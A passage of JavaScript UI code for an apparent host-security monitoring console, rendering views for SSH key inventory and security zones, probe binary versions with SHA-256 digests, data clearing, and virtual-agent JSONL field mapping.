          <td><button type="button" class="linkish" data-host-detail="${esc(h.host_id)}"><strong>${esc(h.display_name)}</strong></button></td>
          <td class="mono">${esc(h.primary_addr || "—")}</td>
          <td>${h.key_count}</td>
          <td>${(h.usernames || []).slice(0, 5).map((u) => `<span class="tag">${esc(u)}</span>`).join(" ") || "—"}</td>
          <td>${esc(h.labels?.profile || "—")} · ${esc(h.labels?.env || "")}</td>
        </tr>`).join("")}
      </tbody></table>`}
    </section>`;
  }

  function sshZones() {
    if (!state.ssh) return sshLoading();
    const zones = state.ssh.zones || [];
    return `
      <div class="stack">
        <section class="panel">
          <div class="panel-head">
            <h3>Security Zones</h3>
            <button class="btn primary" id="btnAddSshZone">Add zone</button>
          </div>
          ${!zones.length ? `<div class="empty">No zones yet</div>` : `
          <table class="data"><thead><tr>
            <th>Name</th><th>Policy</th><th>Host selectors</th><th>Key tags</th><th>Matches</th><th></th>
          </tr></thead><tbody>
            ${zones.map((z) => `<tr>
              <td><strong>${esc(z.zone.name)}</strong><div class="muted" style="font-size:0.8rem">${esc(z.zone.description || "")}</div></td>
              <td><span class="pill neutral">${esc(z.zone.policy)}</span></td>
              <td>${(z.zone.host_selectors || []).map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") || "—"}</td>
              <td>${(z.zone.key_tags || []).map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") || "—"}</td>
              <td>${z.matching_hosts} hosts · ${z.matching_keys} keys${z.cross_zone_keys ? ` · <span class="ssh-pill-reused host-status">${z.cross_zone_keys} cross</span>` : ""}</td>
              <td><button class="btn ghost danger-text" data-del-zone="${esc(z.zone.id)}">Delete</button></td>
            </tr>`).join("")}
          </tbody></table>`}
        </section>
        <section class="panel">
          <div class="panel-head"><h3>How zones work</h3></div>
          <div style="padding:1rem 1.1rem;font-size:0.9rem;color:var(--ink-soft)">
            Zones group hosts (by label/env/profile/tag) with expected key tags — same model as
            <a href="https://docs.sandflysecurity.com/docs/ssh-security-zones" target="_blank" rel="noreferrer">Sandfly Security Zones</a>.
            Cross-zone shared/vendor keys are highlighted for audit.
          </div>
        </section>
      </div>`;
  }

  function sshTags() {
    if (!state.ssh) return sshLoading();
    const tags = state.ssh.tags || [];
    const rows = filteredSshKeys();
    const sel = selectedSshKeys();
    return `
      <div class="tag-workbench-grid">
        <section class="panel">
          <div class="panel-head"><h3>Tags</h3></div>
          <div style="padding:0.85rem">
            ${!tags.length ? `<div class="empty">No tags yet</div>` :
              tags.map((t) => `<button type="button" class="tag" data-ssh-filter-tag="${esc(t)}" style="margin:0.2rem">${esc(t)}</button>`).join("")}
            <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
              <button class="btn primary" id="btnSshBulkTag" ${sel.size ? "" : "disabled"}>Tag selected (${sel.size})</button>
            </div>
          </div>
        </section>
        <section class="panel">
          <div class="panel-head">
            <h3>Tag Workbench <span class="muted">(${rows.length.toLocaleString()})</span></h3>
            <div class="toolbar">
              <input id="sshKeyQ" placeholder="Filter keys…" value="${esc(state._sshKeyQ || "")}" />
              <button class="btn ghost" id="btnSshSelectVisible">Select visible</button>
            </div>
          </div>
          ${sshKeysTable(rows.slice(0, 400), true)}
        </section>
      </div>`;
  }

  async function showSshKeyDetail(fp) {
    try {
      const pack = await api(`/v1/ssh/keys/${encodeURIComponent(fp)}`);
      const k = pack.key || {};
      const places = pack.placements || [];
      openDrawer(shortFp(fp), `
        <dl class="kv">
          <dt>Fingerprint</dt><dd class="mono">${esc(k.fingerprint)}</dd>
          <dt>Type</dt><dd>${esc(k.key_type)} ${k.bits ? `(${esc(k.bits)} bits)` : ""}</dd>
          <dt>Comment</dt><dd>${esc(k.comment || "—")}</dd>
          <dt>First / last seen</dt><dd class="mono">${esc(k.first_seen || "—")} → ${esc(k.last_seen || "—")}</dd>
          <dt>Tags</dt><dd>${(k.tags || []).map((t) => `<span class="tag">${esc(t)}</span>`).join(" ") || "—"}</dd>
          <dt>Placements</dt><dd>${places.length}</dd>
        </dl>
        <h3 style="margin:1.25rem 0 0.5rem;font-size:0.95rem">Placements</h3>
        ${!places.length ? `<div class="empty">No placements</div>` : `
        <table class="data"><thead><tr><th>Host</th><th>User</th><th>Path</th><th>Role</th><th>Seen</th></tr></thead><tbody>
          ${places.map((p) => `<tr>
            <td>${esc(p.display_name || p.host_id)}</td>
            <td>${esc(p.username)}</td>
            <td class="mono">${esc(p.path)}</td>
            <td>${esc(p.role)}</td>
            <td class="mono muted">${esc((p.seen_at || "").slice(0, 19))}</td>
          </tr>`).join("")}
        </tbody></table>`}
        <div class="form-actions" style="justify-content:flex-start;margin-top:1rem">
          <button class="btn ghost" data-goto="ssh-tags">Open tag workbench</button>
        </div>
      `);
      $$("[data-goto]", $("#drawerBody")).forEach((b) => {
        b.addEventListener("click", () => { closeDrawer(); setView(b.dataset.goto); });
      });
    } catch (err) {
      toast(err.message);
    }
  }

  function showAddSshZone() {
    openModal("Add security zone", `
      <form class="form" id="addSshZoneForm">
        <label>Name <input name="name" required placeholder="Production" /></label>
        <label>Description <input name="description" placeholder="Prod hosts; shared keys should not appear" /></label>
        <label>Host selectors (comma-separated env/profile/tags)
          <input name="host_selectors" placeholder="prod, gold" />
        </label>
        <label>Expected key tags (comma-separated)
          <input name="key_tags" placeholder="deploy, host-key" />
        </label>
        <label>Policy
          <select name="policy">
            <option value="alert_on_cross_zone">alert_on_cross_zone</option>
            <option value="allow">allow</option>
            <option value="deny_unknown">deny_unknown</option>
          </select>
        </label>
        <div class="form-actions">
          <button type="button" class="btn ghost" data-close-modal>Cancel</button>
          <button class="btn primary" type="submit">Create</button>
        </div>
      </form>
    `);
    $("#addSshZoneForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const split = (v) => String(v || "").split(/[,;]+/).map((s) => s.trim()).filter(Boolean);
      try {
        await api("/v1/ssh/zones", {
          method: "POST",
          body: {
            name: fd.get("name"),
            description: fd.get("description"),
            host_selectors: split(fd.get("host_selectors")),
            key_tags: split(fd.get("key_tags")),
            policy: fd.get("policy"),
          },
        });
        closeModal();
        toast("Zone created");
        await loadSshHunter();
        render();
      } catch (err) {
        toast(err.message);
      }
    });
  }

  function showBulkTagSsh() {
    const fps = [...selectedSshKeys()];
    if (!fps.length) return;
    openModal(`Tag ${fps.length} key(s)`, `
      <form class="form" id="bulkTagSshForm">
        <label>Tags to add (comma-separated)
          <input name="add" placeholder="pci, reviewed" />
        </label>
        <label>Tags to remove (comma-separated)
          <input name="remove" placeholder="untrusted" />
        </label>
        <div class="form-actions">
          <button type="button" class="btn ghost" data-close-modal>Cancel</button>
          <button class="btn primary" type="submit">Apply</button>
        </div>
      </form>
    `);
    $("#bulkTagSshForm").addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(e.target);
      const split = (v) => String(v || "").split(/[,;]+/).map((s) => s.trim()).filter(Boolean);
      try {
        const res = await api("/v1/ssh/keys", {
          method: "POST",
          body: { fingerprints: fps, add: split(fd.get("add")), remove: split(fd.get("remove")) },
        });
        closeModal();
        toast(`Tagged ${res.updated} key(s)`);
        await loadSshHunter();
        render();
      } catch (err) {
        toast(err.message);
      }
    });
  }

  function shortSha(sha) {
    const s = String(sha || "");
    if (s.length <= 20) return s || "—";
    return `${s.slice(0, 12)}…${s.slice(-8)}`;
  }

  function shaCellHtml(sha, error) {
    if (!sha) {
      return `<span class="muted">${esc(error || "—")}</span>`;
    }
    return `
      <code class="sha-full mono" title="SHA-256">${esc(sha)}</code>
      <div class="sha-actions">
        <button type="button" class="btn ghost" data-copy-sha="${esc(sha)}" style="font-size:0.72rem;padding:0.2rem 0.45rem">Copy SHA-256</button>
        <span class="muted mono" style="font-size:0.7rem">${esc(shortSha(sha))}</span>
      </div>`;
  }

  function hostAgentInfo(h) {
    if (isVirtualHost(h)) {
      return {
        id: "virtual",
        title: "Virtual",
        short: "virtual",
        detail: "log ingest · no SSH",
      };
    }
    if (isAgentLiteHost(h)) {
      return {
        id: "agentlite",
        title: "AgentLite",
        short: "agentlite",
        detail: "SSH commands only · no binary",
      };
    }
    return {
      id: "ssh",
      title: "SSH probe",
      short: "ssh",
      detail: "ephemeral binary over SSH",
    };
  }

  function agentDetailCardsHtml(pack) {
    const info = pack?.agentless_info || {};
    const lite = pack?.agentlite || {};
    const platforms = (pack?.agentless || [])
      .map((p) => {
        const probeOk = !!p.probe?.present;
        const loaderOk = !!p.loader?.present;
        return `${p.label || p.arch || p.triple}: probe ${probeOk ? "✓" : "✗"} · loader ${loaderOk ? "✓" : "✗"}`;
      })
      .join(" · ") || "—";
    const list = (items) =>
      `<ul style="margin:0.35rem 0 0;padding-left:1.15rem;font-size:0.82rem;line-height:1.45">${
        (items || []).map((x) => `<li>${esc(x)}</li>`).join("")
      }</ul>`;
    return `
      <div class="settings-grid" style="padding:0 1.1rem 1rem;gap:0.85rem">
        <section class="panel" style="margin:0;box-shadow:none;border:1px solid var(--line)">
          <div class="panel-head" style="padding:0.75rem 0.95rem">
            <h3 style="font-size:0.95rem;margin:0">Agentless (SSH probe)</h3>
            <span class="tag">preferred</span>
          </div>
          <div style="padding:0 0.95rem 0.95rem;font-size:0.88rem">
            <p class="muted" style="margin:0 0 0.65rem">${esc(info.description || "Ephemeral Linux probe delivered over SSH.")}</p>
            <div class="settings-kv">
              <div><dt>Binary</dt><dd class="mono">${esc(info.name || "rustmite-probe")}</dd></div>
              <div><dt>Version</dt><dd class="mono">${esc(info.version || pack?.agentless_version || "?")}</dd></div>
              <div><dt>Host footprint</dt><dd>${esc(info.host_footprint || "Ephemeral; no persistent install")}</dd></div>
              <div><dt>Privilege</dt><dd>${esc(info.privilege || "SSH user (+ optional sudo)")}</dd></div>
              <div><dt>Coverage</dt><dd>${esc(info.coverage || "Full catalog when collectors succeed")}</dd></div>
              <div><dt>Platform artifacts</dt><dd class="mono" style="font-size:0.78rem">${esc(platforms)}</dd></div>
            </div>
            <p style="margin:0.75rem 0 0;font-weight:600;font-size:0.82rem">Delivery (attempt order)</p>
            ${list(info.delivery_methods)}
            <p style="margin:0.75rem 0 0;font-weight:600;font-size:0.82rem">Binaries</p>
            ${list(info.binaries)}
          </div>
        </section>
        <section class="panel" style="margin:0;box-shadow:none;border:1px solid var(--line)">
          <div class="panel-head" style="padding:0.75rem 0.95rem">
            <h3 style="font-size:0.95rem;margin:0">AgentLite</h3>
            <span class="tag">no binary on host</span>
          </div>
          <div style="padding:0 0.95rem 0.95rem;font-size:0.88rem">
            <p class="muted" style="margin:0 0 0.65rem">${esc(lite.description || "SSH commands-only collection.")}</p>
            <div class="settings-kv">
              <div><dt>Component</dt><dd class="mono">${esc(lite.name || "rustmite-agentlite")}</dd></div>
              <div><dt>Version</dt><dd class="mono">${esc(lite.version || pack?.agentless_version || "?")}</dd></div>
              <div><dt>Delivery</dt><dd class="mono">${esc(lite.delivery || "ssh_commands")} (Method D)</dd></div>
              <div><dt>Host footprint</dt><dd>${esc(lite.host_footprint || "None — shell commands only")}</dd></div>
              <div><dt>Privilege</dt><dd>${esc(lite.privilege || "SSH user (+ optional sudo)")}</dd></div>
              <div><dt>Coverage</dt><dd>${esc(lite.coverage || "Degraded vs full probe")}</dd></div>
              <div><dt>Policy finding</dt><dd class="mono">${esc(lite.policy_finding || "RM-POL-0021")}</dd></div>
              <div><dt>Select when</dt><dd>Add hosts → Agent → AgentLite · or Edit host → Agent</dd></div>
            </div>
            <p style="margin:0.75rem 0 0;font-weight:600;font-size:0.82rem">Collectors (SSH shell)</p>
            ${list(lite.collectors)}
          </div>
        </section>
      </div>`;
  }

  function versionRowsHtml(pack) {
    if (!pack) {
      return `<div class="empty">Version inventory not loaded</div>`;
    }
    const rows = [];
    const server = pack.server || {};
    rows.push({
      kind: "Server",
      platform: "control plane",
      name: server.name || "rustmite-server",
      version: server.version || "?",
      sha256: server.sha256,
      present: !!server.present,
      path: server.path,
      size: server.size_bytes,
      error: server.error,
    });
    (pack.agentless || []).forEach((p) => {
      ["probe", "loader"].forEach((k) => {
        const b = p[k] || {};
        rows.push({
          kind: k === "probe" ? "Agentless probe" : "Agentless loader",
          platform: p.label || p.arch || p.triple,
          bits: p.bits,
          name: b.name || k,
          version: b.version || pack.agentless_version || "?",
          sha256: b.sha256,
          present: !!b.present,
          path: b.path,
          size: b.size_bytes,
          error: b.error,
        });
      });
    });
    const lite = pack.agentlite || {};
    rows.push({
      kind: "AgentLite",
      platform: "SSH commands only",
      name: lite.name || "rustmite-agentlite",
      version: lite.version || pack.agentless_version || "?",
      sha256: null,
      present: lite.present !== false,
      path: null,
      size: null,
      error: null,
      note: lite.description || "No probe binary on host (Method D)",
      delivery: lite.delivery || "ssh_commands",
    });
    const presentWithSha = rows.filter((r) => r.sha256);
    return `
      ${agentDetailCardsHtml(pack)}
      <div class="version-hero">
        <div class="version-hero-item">
          <label>Control plane SHA-256</label>
          ${shaCellHtml(server.sha256, server.error || "digest unavailable")}
        </div>
        <div class="version-hero-item">
          <label>Digests available</label>
          <div><strong>${presentWithSha.length}</strong> <span class="muted">of ${rows.filter((r) => r.kind !== "AgentLite").length} hashed components</span></div>
          <div class="muted" style="font-size:0.78rem;margin-top:0.25rem">Full SHA-256 shown below — click Copy to clipboard</div>
        </div>
      </div>
      <table class="data version-table"><thead><tr>
        <th>Component</th><th>Platform</th><th>Version</th><th>SHA-256</th><th>Status</th>
      </tr></thead><tbody>
        ${rows.map((r) => `<tr class="${r.present ? "" : "row-missing"}">
          <td><strong>${esc(r.kind)}</strong><div class="muted mono" style="font-size:0.72rem">${esc(r.name)}</div>
            ${r.note ? `<div class="muted" style="font-size:0.72rem;margin-top:0.2rem">${esc(r.note)}</div>` : ""}
          </td>
          <td>${esc(r.platform)}${r.bits ? `<div class="muted" style="font-size:0.72rem">${esc(String(r.bits))}-bit</div>` : ""}${r.delivery ? `<div class="muted mono" style="font-size:0.72rem">${esc(r.delivery)}</div>` : ""}</td>
          <td class="mono">${esc(r.version)}</td>
          <td class="sha-cell">
            ${r.kind === "AgentLite"
              ? `<span class="muted" style="font-size:0.82rem">n/a — no binary artifact</span>`
              : shaCellHtml(r.sha256, r.error)}
            ${r.path ? `<div class="muted" style="font-size:0.7rem;max-width:28rem;overflow:hidden;text-overflow:ellipsis;margin-top:0.25rem" title="${esc(r.path)}">${esc(r.path)}</div>` : ""}
          </td>
          <td>${r.present
            ? `<span class="host-status active">present</span>${r.size != null ? `<div class="muted" style="font-size:0.72rem">${esc(String(r.size))} bytes</div>` : ""}`
            : `<span class="host-status inactive">missing</span>`}
          </td>
        </tr>`).join("")}
      </tbody></table>
      <p class="muted" style="margin:0.75rem 1.1rem 1rem;font-size:0.8rem">
        Agentless package version <span class="mono">${esc(pack.agentless_version || "?")}</span>.
        AgentLite is compiled into the scanner node (no separate ELF).
        Probe search roots: ${(pack.probe_search_roots || []).map((r) => `<span class="mono">${esc(r)}</span>`).join(" · ") || "—"}.
        Build probes with <span class="mono">cargo xtask build-probes --target &lt;triple&gt;</span>.
      </p>`;
  }

  function data() {
    const s = state.dataSummary;
    if (!s) {
      return `<section class="panel"><div class="empty">Loading data summary…</div></section>`;
    }
    const fmt = (n) => (n == null ? "—" : Number(n).toLocaleString());
    const fmtBytes = (n) => {
      const v = Number(n || 0);
      if (v < 1024) return `${v} B`;
      if (v < 1024 * 1024) return `${(v / 1024).toFixed(1)} KiB`;
      return `${(v / (1024 * 1024)).toFixed(1)} MiB`;
    };
    const clearable = [
      {
        group: "Operational",
        items: [
          { id: "findings", title: "Findings", count: s.findings ?? 0, blurb: "Alert findings (Findings view, deep links)." },
          { id: "scans", title: "Scans", count: s.scans ?? 0, blurb: "Scan jobs, queue history, and coverage metas." },
          { id: "observations", title: "Observations", count: s.observations ?? 0, blurb: "Raw probe observations (process, sockets, …)." },
          { id: "activity", title: "Activity", count: s.activity ?? 0, blurb: "Operator / scan progress activity feed." },
          { id: "baselines", title: "Baselines", count: s.baselines ?? 0, blurb: "Per-host integrity / drift baseline snapshots." },
          { id: "host_keys", title: "Host key pins", count: s.host_keys ?? 0, blurb: "Pinned SSH host keys used for auth trust." },
        ],
      },
      {
        group: "Hunt",
        items: [
          {
            id: "events",
            title: "ClickHouse events",
            count: s.events == null ? "—" : s.events,
            blurb: s.clickhouse
              ? "Hunt / RPL ingest rows (events + detection_signals)."
              : "ClickHouse not configured — events cannot be cleared.",
            disabled: !s.clickhouse,
          },
          {
            id: "virtual_ingest",
            title: "Virtual ingest",
            count: s.virtual_ingest_hosts ?? 0,
            blurb: `JSONL caches under .dev/ingest (${fmtBytes(s.virtual_ingest_bytes)}). Cleared with matching ClickHouse blobs.`,
          },
        ],
      },
      {
        group: "Credentials",
        items: [
          {
            id: "ssh_identities",
            title: "SSH private keys",
            count: s.ssh_identities_count ?? 0,
            blurb: `Node-sealed identities in the control-plane database (${fmt(s.hosts_with_ssh_identity)} host(s) reference one).`,
          },
          {
            id: "ssh_passwords",
            title: "SSH passwords",
            count: s.ssh_passwords_count ?? 0,
            blurb: `Node-sealed passwords in the control-plane database (${fmt(s.hosts_with_ssh_password)} host(s) reference one).`,
          },
        ],
      },
    ];
    const inventory = [
      { title: "Hosts", count: s.hosts ?? 0, hint: "enrolled fleet" },
      { title: "Nodes", count: s.nodes ?? 0, hint: "scanner agents" },
      { title: "SSH keys", count: s.ssh_keys ?? 0, hint: "hunter key records" },
      { title: "SSH placements", count: s.ssh_placements ?? 0, hint: "key × host × user" },
      { title: "SSH zones", count: s.ssh_zones ?? 0, hint: "security zones" },
    ];
    const credTable = (title, storage, rows, emptyMsg) => `
      <div style="margin-top:0.85rem">
        <div class="panel-head" style="padding:0 0 0.45rem;border:0">
          <h4 style="margin:0;font-size:0.92rem">${esc(title)}</h4>
          <span class="muted mono" style="font-size:0.75rem">${esc(storage || "database")}</span>
        </div>
        ${!(rows || []).length
          ? `<div class="empty" style="padding:0.65rem 0">${esc(emptyMsg)}</div>`
          : `<div class="data-table-wrap"><table class="data"><thead><tr>
              <th>Id</th><th>Size</th><th>Sealed</th><th>Updated</th><th>Used by</th>
            </tr></thead><tbody>
              ${(rows || []).map((f) => `
                <tr>
                  <td class="mono" title="${esc(f.path || "")}">${esc(f.name)}</td>
                  <td class="mono">${fmtBytes(f.bytes)}</td>
                  <td>${f.sealed
                    ? `<span class="tag">node-sealed</span>`
                    : `<span class="tag" title="Legacy plaintext — re-upload to seal">legacy</span>`}</td>
                  <td class="mono muted" style="font-size:0.78rem">${esc(f.modified_at || "—")}</td>
                  <td>${(f.used_by || []).length
                    ? (f.used_by || []).map((n) => `<span class="tag">${esc(n)}</span>`).join(" ")
                    : `<span class="muted">—</span>`}</td>
                </tr>`).join("")}
            </tbody></table></div>`}
      </div>`;
    return `
      <div class="stats">
        <div class="stat"><div class="label">Findings</div><div class="value">${fmt(s.findings)}</div><div class="hint">alerts</div></div>
        <div class="stat"><div class="label">Scans</div><div class="value">${fmt(s.scans)}</div><div class="hint">jobs + metas</div></div>
        <div class="stat"><div class="label">Events</div><div class="value">${fmt(s.events)}</div><div class="hint">${s.clickhouse ? "ClickHouse" : "CH unset"}</div></div>
        <div class="stat"><div class="label">SSH identities</div><div class="value">${fmt(s.ssh_identities_count)}</div><div class="hint">in database</div></div>
        <div class="stat"><div class="label">SSH passwords</div><div class="value">${fmt(s.ssh_passwords_count)}</div><div class="hint">in database</div></div>
        <div class="stat"><div class="label">SSH keys</div><div class="value">${fmt(s.ssh_keys)}</div><div class="hint">${fmt(s.ssh_placements)} placements</div></div>
      </div>
      <section class="panel">
        <div class="panel-head">
          <h3>Stored credentials</h3>
          <span class="muted">Metadata only — secrets are never shown</span>
        </div>
        <div style="padding:0.15rem 1.1rem 1.1rem">
          <p class="muted" style="margin:0 0 0.55rem;font-size:0.85rem">
            SSH private keys and passwords are sealed for scanner nodes (X25519) and stored as ciphertext in the control-plane database.
            The server cannot decrypt them. Host labels reference credential ids (<span class="mono">ssh_identity</span> / <span class="mono">ssh_password_file</span>).
          </p>
          ${credTable("SSH private keys", s.credential_storage || "database", s.ssh_identities, "No identities yet — upload when adding a host.")}
          ${credTable("SSH passwords", s.credential_storage || "database", s.ssh_passwords, "No passwords yet — save a password when adding a host.")}
        </div>
      </section>
      <section class="panel">
        <div class="panel-head">
          <h3>Clear data</h3>
          <div class="form-actions" style="margin:0;gap:0.5rem">
            <button type="button" class="btn ghost" id="btnReloadData">Refresh</button>
            <button type="button" class="btn danger" id="btnClearDataAll">Clear all operational + hunt</button>
          </div>
        </div>
        <div class="data-clear-list">
          <p class="muted" style="margin:0 0 0.85rem;font-size:0.88rem">
            Wipe selected datasets. Hosts, SSH hunter inventory, and settings are kept.
            Credential clears are explicit (not included in “Clear all”).
          </p>
          ${clearable.map((g) => `
            <h4 class="data-group-title">${esc(g.group)}</h4>
            ${g.items.map((r) => `
              <div class="data-clear-row">
                <div class="data-clear-main">
                  <strong>${esc(r.title)}</strong>
                  <span class="mono data-clear-count">${typeof r.count === "number" ? r.count.toLocaleString() : esc(String(r.count))}</span>
                  <span class="muted">${esc(r.blurb)}</span>
                </div>
                <button type="button" class="btn danger" data-clear-target="${esc(r.id)}" ${r.disabled ? "disabled" : ""}>Clear</button>
              </div>
            `).join("")}
          `).join("")}
        </div>
      </section>
      <section class="panel">
        <div class="panel-head"><h3>Inventory (kept)</h3>
          <span class="muted">Not cleared by “Clear all”</span>
        </div>
        <div class="settings-kv" style="padding-bottom:1rem">
          ${inventory.map((r) => `
            <div><dt>${esc(r.title)}</dt><dd>${fmt(r.count)} <span class="muted">${esc(r.hint)}</span></dd></div>
          `).join("")}
          <div><dt>Platform blobs</dt><dd>${fmt(s.platform_blobs)} <span class="muted">AnoMark / virtual CH cache</span></dd></div>
        </div>
      </section>`;
  }

  async function loadDataSummary() {
    state.dataSummary = await api("/v1/data/summary");
    return state.dataSummary;
  }

  async function clearDataTargets(targets) {
    const list = Array.isArray(targets) ? targets : [targets];
    const label = list.join(", ");
    if (!confirm(`Clear ${label}? This cannot be undone.`)) return;
    if (list.includes("ssh_identities") || list.includes("ssh_passwords")) {
      if (!confirm("This permanently deletes sealed credential files from disk. Hosts that reference them will fail to authenticate until reconfigured. Continue?")) {
        return;
      }
    }
    const res = await api("/v1/data/clear", { method: "POST", body: { targets: list } });
    const purged = res.purged || {};
    const parts = Object.entries(purged).map(([k, v]) => `${k}: ${v}`);
    toast(parts.length ? `Cleared ${parts.join(" · ")}` : "Cleared");
    await Promise.all([
      loadDataSummary().catch(() => null),
      loadAll().catch(() => null),
    ]);
    if (state.view === "data") render();
    else if (list.includes("findings") || list.includes("all")) {
      state.selectedFinding = null;
      closeDrawer();
    }
  }

  function wireDataPage() {
    if (state.view !== "data") return;
    const reload = $("#btnReloadData");
    if (reload) {
      reload.addEventListener("click", async () => {
        try {
          await loadDataSummary();
          toast("Data summary refreshed");
          render();
        } catch (err) {
          toast(err.message);
        }
      });
    }
    const allBtn = $("#btnClearDataAll");
    if (allBtn) {
      allBtn.addEventListener("click", () => {
        clearDataTargets(["all"]).catch((err) => toast(err.message));
      });
    }
    $$("[data-clear-target]").forEach((btn) => {
      btn.addEventListener("click", () => {
        const t = btn.getAttribute("data-clear-target");
        if (!t) return;
        clearDataTargets([t]).catch((err) => toast(err.message));
      });
    });
  }

  function aliasesField(label, name, arr) {
    return `<label>${esc(label)}
      <input name="${esc(name)}" class="mono" value="${esc((arr || []).join(", "))}" placeholder="json_key, alias2" />
    </label>`;
  }

  function readAliases(fd, name) {
    return String(fd.get(name) || "")
      .split(/[,;\s]+/)
      .map((s) => s.trim())
      .filter(Boolean);
  }

  function virtualAgentOptionsHtml(selectedId) {
    const profiles = state.virtualAgents || [];
    if (!profiles.length) {
      return `<option value="">(no profiles — create one in Settings)</option>`;
    }
    return profiles.map((p) =>
      `<option value="${esc(p.id)}" ${selectedId === p.id ? "selected" : ""}>${esc(p.name)} (${esc(p.preset || "custom")})</option>`
    ).join("");
  }

  function virtualAgentsSettingsHtml(profiles, selected, enrolled) {
    const p = selected;
    const pm = p?.map?.process || {};
    const fm = p?.map?.file || {};
    const compose = pm.compose || "command_field";
    return `
      <div class="stack">
        <section class="panel">
          <div class="panel-head">
            <h3>Virtual agent profiles</h3>
            <div class="toolbar">
              <button type="button" class="btn ghost" id="btnImportTree">Import tree</button>
              <button type="button" class="btn primary" id="btnVirtualHost">Create host…</button>
            </div>
          </div>
          <div style="padding:0.85rem 1.1rem">
            <p class="muted" style="margin:0 0 0.85rem;font-size:0.88rem">
              Profiles define how JSONL fields map into process/file inventory
              (process name, command line, path, …). Pick a profile when adding a virtual host,
              then import a file or directory — the mapping is stored on the host.
            </p>
            <div class="va-layout">
              <div class="va-list">
                <div class="form-actions" style="justify-content:space-between;margin:0 0 0.65rem">
                  <strong>Profiles</strong>
                  <button type="button" class="btn ghost tiny" id="btnVaNew">New</button>
                </div>
                ${!profiles.length
                  ? `<div class="empty">No profiles yet</div>`
                  : `<div class="va-profile-list">${profiles.map((x) => `
                      <button type="button" class="va-profile-item ${x.id === p?.id ? "active" : ""}" data-va-select="${esc(x.id)}">
                        <strong>${esc(x.name)}</strong>
                        <span class="muted mono">${esc(x.id)}</span>
                        <span class="tag">${esc(x.preset || "custom")}</span>
                      </button>`).join("")}</div>`}
              </div>
              <div class="va-editor">
                ${!p ? `<div class="empty">Select or create a profile</div>` : `
                <form class="form" id="vaProfileForm">
                  <input type="hidden" name="id" value="${esc(p.id)}" />
                  <div class="form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:0.6rem">
                    <label>Name
                      <input name="name" required value="${esc(p.name)}" />
                    </label>
                    <label>Preset base
                      <select name="preset" id="vaPreset">
                        ${["pulsesecure", "osquery", "sysmon", "custom"].map((id) =>
                          `<option value="${id}" ${p.preset === id ? "selected" : ""}>${id}</option>`).join("")}
                      </select>
                    </label>
                  </div>
                  <label>Description
                    <input name="description" value="${esc(p.description || "")}" placeholder="Used for PulseSecure VPN snapshots" />
                  </label>
                  <label>Default kind
                    <select name="kind">
                      ${["auto", "processes", "files"].map((k) =>
                        `<option value="${k}" ${(p.kind || "auto") === k ? "selected" : ""}>${k}</option>`).join("")}
                    </select>
                  </label>
                  <h4 style="margin:1rem 0 0.45rem;font-size:0.9rem">Process field mapping</h4>
                  <p class="muted" style="margin:0 0 0.55rem;font-size:0.78rem">
                    Comma-separated JSON keys (first match wins).
                  </p>
                  <div class="form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:0.55rem">
                    ${aliasesField("Process name", "proc_name", pm.name)}
                    ${aliasesField("Command line", "proc_command", pm.command)}
                    ${aliasesField("Executable path", "proc_path", pm.path)}
                    ${aliasesField("Args", "proc_args", pm.args)}
                    ${aliasesField("PID", "proc_pid", pm.pid)}
                    ${aliasesField("PPID", "proc_ppid", pm.ppid)}
                    ${aliasesField("UID / user", "proc_uid", pm.uid)}
                    ${aliasesField("Host / machine", "proc_machine", pm.machine_id)}
                    ${aliasesField("Timestamp", "proc_ts", pm.timestamp)}
                    <label>Compose command from
                      <select name="compose">
                        <option value="command_field" ${compose === "command_field" ? "selected" : ""}>command field</option>
                        <option value="path_then_args" ${compose === "path_then_args" ? "selected" : ""}>path + args</option>
                        <option value="name_then_args" ${compose === "name_then_args" ? "selected" : ""}>name + args</option>
                      </select>
                    </label>
                  </div>
                  <h4 style="margin:1rem 0 0.45rem;font-size:0.9rem">File field mapping</h4>
                  <div class="form-grid" style="display:grid;grid-template-columns:1fr 1fr;gap:0.55rem">
                    ${aliasesField("File path", "file_path", fm.path)}
                    ${aliasesField("Host / machine", "file_machine", fm.machine_id)}
                    ${aliasesField("Timestamp", "file_ts", fm.timestamp)}
                    ${aliasesField("mtime", "file_mtime", fm.mtime)}
                    ${aliasesField("Permissions", "file_perms", fm.permissions)}
                    ${aliasesField("Owner", "file_owner", fm.owner)}
                    ${aliasesField("Group", "file_group", fm.group)}
                    ${aliasesField("Size", "file_size", fm.size)}
                  </div>
                  <div class="form-actions" style="justify-content:space-between;margin-top:1rem">
                    <button type="button" class="btn danger" id="btnVaDelete" ${["pulsesecure","osquery","sysmon"].includes(p.id) ? "disabled title=\"Built-in profile\"" : ""}>Delete</button>
                    <div style="display:flex;gap:0.5rem">
                      <button type="button" class="btn ghost" id="btnVaResetPreset">Reset from preset</button>
                      <button type="submit" class="btn primary">Save profile</button>
                    </div>
                  </div>
                </form>
                <hr style="border:none;border-top:1px solid var(--line);margin:1.1rem 0" />
                <h4 style="margin:0 0 0.45rem;font-size:0.9rem">Preview mapping</h4>
                <textarea id="vaPreviewSample" rows="5" class="mono" placeholder='Paste a few JSONL lines…&#10;{"event_type":"process","command":"/usr/sbin/sshd -D","pid":42}'></textarea>
                <div class="form-actions" style="justify-content:flex-start;margin-top:0.5rem">
                  <button type="button" class="btn ghost" id="btnVaPreview">Preview</button>
                </div>
                <div id="vaPreviewOut" class="muted" style="margin-top:0.65rem;font-size:0.8rem"></div>
                `}
              </div>
            </div>
          </div>
        </section>
        <section class="panel">
          <div class="panel-head">
            <h3>Enrolled virtual hosts</h3>
            <span class="muted">${enrolled.length}</span>
          </div>
          <div style="padding:0.85rem 1.1rem">
            ${!enrolled.length
              ? `<div class="empty">No virtual hosts yet — use <strong>Create host…</strong> or Hosts → Add hosts → Virtual agent.</div>`
              : `<table class="data"><thead><tr>
                  <th>Host</th><th>Profile</th><th>Token</th><th></th>
                </tr></thead><tbody>
                  ${enrolled.map((h) => {
                    const tok = h.ingest_token || "";
                    const pid = h.labels?.virtual_agent || "—";
                    return `<tr>
                      <td><a class="finding-link" href="#host/${encodeURIComponent(h.id)}" data-goto-host="${esc(h.id)}"><strong>${esc(h.display_name)}</strong></a></td>
                      <td class="mono">${esc(pid)}</td>
